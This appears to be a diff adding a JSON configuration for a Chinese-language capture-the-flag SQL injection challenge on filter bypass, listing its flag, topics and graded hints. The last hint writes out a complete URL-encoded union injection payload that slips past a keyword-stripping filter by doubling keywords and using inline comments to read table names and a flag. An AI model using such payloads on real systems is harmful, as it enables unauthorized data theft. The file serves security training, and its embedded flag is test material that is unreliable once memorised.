@@ -1,0 +1,24 @@
+{
+  "id": "sql9",
+  "category": "sql",
+  "title": "过滤与绕过",
+  "difficulty": "hard",
+  "url_path": "/sql9",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{sql9_98da9c42}",
+  "knowledge": [
+    "黑名单过滤绕过",
+    "内联注释 /**/ 替代空格",
+    "双写绕过 str_ireplace",
+    "SQLite sqlite_master"
+  ],
+  "hints": [
+    "先随便输入 a' and 1=1-- 看看页面上『WAF 之后』那一栏 —— 空格、and、-- 都被删掉了。注意 WAF 的实现是『删掉危险词就完事』，删完并没有再检查一遍。",
+    "被删掉的关键字可以『双写』长回来：selselectect 删掉中间的 select 后剩下的仍是 select（str_ireplace 只扫一遍）。空格用 /**/ 代替（%0a 换行也行）。union 的结尾注意：原 SQL 是 LIKE '%...%'，最后那个 %' 要靠 or '1 之类闭合。",
+    "第一步查表名（URL 编码后直接用）：\n?q=x%27%2F**%2Funiunionon%2F**%2Fselselectect%2F**%2F1%2Cname%2C3%2F**%2Ffrfromom%2F**%2Fsqlite_master%2F**%2Fwhwhereere%2F**%2F1%2F**%2Foorr%2F**%2F%271\n第二步把 sqlite_master 换成 s3cret_vault、name 换成 flag，flag 就在第二列。"
+  ],
+  "writeup": "writeup.md",
+  "prev": "sql8",
+  "next": null
+}
